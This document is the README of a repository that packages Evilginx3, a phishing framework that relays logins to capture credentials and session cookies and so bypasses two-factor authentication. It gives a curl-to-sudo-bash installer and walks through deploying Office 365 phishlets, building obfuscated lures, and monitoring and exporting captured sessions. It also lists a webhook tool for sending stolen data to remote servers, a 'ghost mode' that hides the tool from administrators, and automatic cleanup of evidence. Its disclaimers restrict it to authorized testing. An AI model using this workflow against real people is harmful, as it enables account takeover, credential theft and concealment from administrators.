# EVILGINX3 - Advanced Phishing Framework

![Evilginx3](https://img.shields.io/badge/Evilginx3-Advanced%20Phishing-red?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational%20Use-orange?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=for-the-badge)

## ⚠️ IMPORTANT DISCLAIMER

**This tool is for EDUCATIONAL and AUTHORIZED PENETRATION TESTING purposes ONLY.**

- Only use this on systems you own or have explicit written permission to test
- Unauthorized use is illegal and unethical
- The authors are not responsible for misuse of this software
- Always comply with local laws and regulations

## 📖 What is Evilginx3?

Evilginx3 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows for bypassing 2-factor authentication protection. This tool is designed for authorized penetration testing and security research.

### How It Works (Simple Explanation)

Think of Evilginx3 as a "fake website" that looks exactly like a real website (like Gmail, Facebook, etc.). When someone tries to log in:

1. **Victim visits your fake site** - They think they're on the real website
2. **Evilginx3 captures everything** - Username, password, and session tokens
3. **Forwards to real site** - The victim gets logged in normally and doesn't suspect anything
4. **You get access** - You can now access their account even if they have 2FA enabled

## 🚀 Quick Start Guide

### Prerequisites

- **Linux Server** (Ubuntu 20.04+ recommended)
- **Domain Name** (e.g., `yourdomain.com`)
- **Root Access** to the server
- **Basic Linux Knowledge**

### One-Command Installation

```bash
# Download and run the automated installer
curl -sSL https://raw.githubusercontent.com/brooksjoey/EVILGINX3/main/one_cmd_deploy.sh | sudo bash
```

This will automatically:
- Install all dependencies
- Set up Evilginx3
- Configure SSL certificates
- Set up basic security
- Create phishing templates

### Manual Installation

If you prefer to install manually:

```bash
# 1. Clone the repository
git clone https://github.com/brooksjoey/EVILGINX3.git
cd EVILGINX3

# 2. Run the deployment script
sudo ./deploy_evilginx3.sh

# 3. Configure your domain
sudo python3 daemon_manager.py configure
```

## 🛠️ Tools Overview

This framework includes a comprehensive suite of tools to make phishing campaigns more effective and secure:

### Core Tools

| Tool | Purpose | What It Does |
|------|---------|--------------|
| `dns_autoconfig.sh` | DNS Setup | Automatically configures DNS records for your domain |
| `session_manager.sh` | Session Monitoring | Monitors and extracts captured credentials in real-time |
| `backup_manager.sh` | Backup & Recovery | Creates encrypted backups of your entire setup |
| `security_hardening.sh` | Security | Hardens your server against detection and attacks |

### Lure Generation Tools

| Tool | Purpose | What It Does |
|------|---------|--------------|
| `lure_generator.sh` | Basic Lures | Creates simple phishing URLs |
| `lure_forge_basic.sh` | Advanced Lures | Creates obfuscated and encoded phishing links |
| `lure_forge_redirect.sh` | Redirect Lures | Creates lures that use redirector services |
| `lure_injector.sh` | HTML Injection | Injects lure URLs into HTML templates |
| `lure_render_all.sh` | Batch Processing | Renders multiple lure pages at once |

### Management Tools

| Tool | Purpose | What It Does |
|------|---------|--------------|
| `phishlet_deploy.sh` | Phishlet Management | Downloads and deploys phishing templates |
| `resilience.sh` | System Resilience | Ensures your setup stays online |
| `watchdog.sh` | Monitoring | Monitors system health and restarts services |
| `webhook_harvester.sh` | Data Exfiltration | Securely sends captured data to remote servers |
| `ghost_mode.sh` | Stealth Mode | Hides Evilginx3 from system administrators |

## 📋 Step-by-Step Usage Guide

### Step 1: Initial Setup

1. **Get a Domain**: Purchase a domain name (e.g., `securelogin-portal.com`)
2. **Get a Server**: Rent a VPS (DigitalOcean, AWS, etc.)
3. **Point Domain to Server**: Update DNS A records to point to your server's IP

### Step 2: Install Evilginx3

```bash
# Quick installation
curl -sSL https://raw.githubusercontent.com/brooksjoey/EVILGINX3/main/one_cmd_deploy.sh | sudo bash
```

### Step 3: Configure DNS (Automatic)

```bash
# For Cloudflare users
CLOUDFLARE_API_TOKEN=your_token DNS_PROVIDER=cloudflare ./tools/dns_autoconfig.sh

# For manual setup (shows you what records to create)
DNS_PROVIDER=manual ./tools/dns_autoconfig.sh
```

### Step 4: Set Up Security

```bash
# Complete security hardening
sudo ./tools/security_hardening.sh all
```

### Step 5: Create Phishing Campaign

```bash
# Deploy a phishlet (e.g., Office 365)
./tools/phishlet_deploy.sh

# Generate lure URLs
./tools/lure_generator.sh

# Start session monitoring
./tools/session_manager.sh monitor
```

### Step 6: Monitor Results

```bash
# Check captured sessions
./tools/session_manager.sh stats

# View security status
./tools/security_hardening.sh status

# Check system health
python3 daemon_manager.py status
```

## 🎯 Common Use Cases

### 1. Penetration Testing

**Scenario**: Testing employee awareness in a company

```bash
# 1. Set up with company-themed domain
# 2. Create Office 365 phishlet
./tools/phishlet_deploy.sh
# 3. Generate professional-looking lures
./tools/lure_forge_basic.sh
# 4. Monitor results
./tools/session_manager.sh interactive
```

### 2. Red Team Exercises

**Scenario**: Simulating advanced persistent threats

```bash
# 1. Enable ghost mode for stealth
sudo ./tools/ghost_mode.sh
# 2. Set up multiple phishlets
./tools/phishlet_deploy.sh
# 3. Use webhook harvesting for data exfiltration
./tools/webhook_harvester.sh
```

### 3. Security Awareness Training

**Scenario**: Training employees to recognize phishing

```bash
# 1. Create educational phishing campaign
# 2. Use session manager to track who falls for it
./tools/session_manager.sh export
# 3. Generate reports for training purposes
```

## 🔧 Configuration

### Basic Configuration

Edit the main configuration file:

```bash
nano /opt/posh-ai/evilginx3/config.json
```

Key settings:
- `domain`: Your main domain
- `external_ipv4`: Your server's IP address
- `https_port`: HTTPS port (usually 443)

### Advanced Configuration

#### DNS Settings
```bash
# Configure DNS provider
export DNS_PROVIDER=cloudflare
export CLOUDFLARE_API_TOKEN=your_token
./tools/dns_autoconfig.sh
```

#### Security Settings
```bash
# Set up email alerts
export ALERT_EMAIL=admin@yourdomain.com
./tools/security_hardening.sh monitoring
```

#### Backup Settings
```bash
# Configure remote backups
export REMOTE_BACKUP_DIR=s3://your-bucket/backups
./tools/backup_manager.sh setup-cron
```

## 📊 Monitoring and Management

### Real-Time Monitoring

```bash
# Monitor sessions in real-time
./tools/session_manager.sh monitor

# Watch system logs
tail -f /var/log/evilginx3-security.log

# Check service status
python3 daemon_manager.py status
```

### Data Management

```bash
# Export all captured data
./tools/session_manager.sh export

# Create backup
./tools/backup_manager.sh full

# Clean up old data
./tools/session_manager.sh cleanup 7
```

### Security Monitoring

```bash
# Run security audit
sudo ./tools/security_hardening.sh audit

# Check for intrusions
sudo fail2ban-client status

# View firewall logs
sudo ufw status verbose
```

## 🛡️ Security Features

### Built-in Protection

- **Firewall Configuration**: Automatic UFW setup with rate limiting
- **Intrusion Detection**: Fail2Ban integration with custom rules
- **SSL/TLS Hardening**: Strong encryption and security headers
- **Log Monitoring**: Real-time security event detection
- **Ghost Mode**: Hide Evilginx3 from system administrators

### Stealth Features

- **Process Masking**: Disguise Evilginx3 as system processes
- **Service Obfuscation**: Hide under fake service names
- **Log Rotation**: Automatic cleanup of evidence
- **Encrypted Backups**: All data encrypted at rest

## 🔍 Troubleshooting

### Common Issues

#### "Domain not resolving"
```bash
# Check DNS propagation
./tools/dns_autoconfig.sh verify

# Manual DNS check
dig yourdomain.com
```

#### "SSL certificate errors"
```bash
# Renew certificates
sudo certbot renew

# Check certificate status
./tools/security_hardening.sh status
```

#### "Service not starting"
```bash
# Check service status
python3 daemon_manager.py status

# View logs
journalctl -u evilginx3 -f

# Restart services
python3 daemon_manager.py restart
```

#### "No sessions captured"
```bash
# Check phishlet status
echo "phishlets" | /opt/posh-ai/evilginx3/evilginx

# Verify lure URLs
./tools/lure_generator.sh

# Check firewall
sudo ufw status
```

### Getting Help

1. **Check Logs**: Always start by checking the logs
   ```bash
   tail -f /var/log/evilginx3-security.log
   journalctl -u evilginx3 -f
   ```

2. **Run Diagnostics**: Use built-in diagnostic tools
   ```bash
   python3 daemon_manager.py status
   ./tools/security_hardening.sh audit
   ```

3. **Community Support**: Check the GitHub issues page

## 📁 File Structure

```
EVILGINX3/
├── README.md                    # This file
├── deploy_evilginx3.sh         # Main deployment script
├── one_cmd_deploy.sh           # One-command installer
├── daemon_manager.py           # Service management
├── ssl_automation.sh           # SSL certificate automation
├── session_loader.sh           # Session loading utilities
├── config/
│   └── config.json            # Main configuration
├── core/
│   └── autodeploy.sh          # Core deployment logic
├── phishlets/                 # Phishing templates
│   ├── office365_enterprise.yaml
│   └── securelogin.yaml
├── redirections/              # Redirect templates
│   └── download_example/
├── tools/                     # Utility tools
│   ├── dns_autoconfig.sh      # DNS configuration
│   ├── session_manager.sh     # Session management
│   ├── backup_manager.sh      # Backup & recovery
│   ├── security_hardening.sh  # Security hardening
│   ├── lure_generator.sh      # Lure generation
│   ├── phishlet_deploy.sh     # Phishlet deployment
│   ├── watchdog.sh           # System monitoring
│   └── webhook_harvester.sh   # Data exfiltration
```

## 🔐 Security Best Practices

### For Operators

1. **Use Strong Passwords**: Always use complex passwords
2. **Enable 2FA**: Secure your own accounts
3. **Regular Backups**: Backup your setup regularly
4. **Monitor Logs**: Keep an eye on security logs
5. **Update Regularly**: Keep the system updated

### For Campaigns

1. **Authorized Testing Only**: Only test systems you own
2. **Document Everything**: Keep detailed records
3. **Limit Scope**: Don't go beyond authorized targets
4. **Clean Up**: Remove all traces after testing
5. **Report Findings**: Provide detailed security reports

## 📚 Learning Resources

### Understanding Phishing

- **OWASP Phishing Guide**: Learn about phishing techniques
- **NIST Cybersecurity Framework**: Understand security principles
- **Social Engineering Toolkit**: Learn about social engineering

### Technical Skills

- **Linux Administration**: Essential for managing the server
- **DNS Management**: Understanding how DNS works
- **SSL/TLS**: Certificate management and HTTPS
- **Network Security**: Firewalls and intrusion detection

### Legal and Ethical

- **Penetration Testing Standards**: PTES, OWASP Testing Guide
- **Legal Frameworks**: Understand local laws
- **Ethical Hacking**: Responsible disclosure principles

## 🤝 Contributing

We welcome contributions! Here's how you can help:

### Reporting Issues

1. Check existing issues first
2. Provide detailed error messages
3. Include system information
4. Describe steps to reproduce

### Contributing Code

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

### Improving Documentation

- Fix typos and errors
- Add examples and use cases
- Improve explanations
- Translate to other languages

## 📄 License

This project is licensed for educational and authorized testing purposes only. See the LICENSE file for details.

## 🙏 Acknowledgments

- **Kuba Gretzky** - Original Evilginx creator
- **Security Community** - For continuous improvements
- **Contributors** - Everyone who helps improve this project

## 📞 Support

- **GitHub Issues**: For bug reports and feature requests
- **Documentation**: Check this README and tool help pages
- **Community**: Join discussions in GitHub Discussions

---

**Remember**: With great power comes great responsibility. Use this tool ethically and legally.

## 🚨 Final Warning

**This tool can be used to cause serious harm if misused. Always:**

- ✅ Get written permission before testing
- ✅ Follow responsible disclosure practices
- ✅ Respect privacy and data protection laws
- ✅ Use for legitimate security testing only
- ❌ Never use against unauthorized targets
- ❌ Never steal or misuse captured data
- ❌ Never cause harm or disruption

**Stay ethical, stay legal, stay safe.**
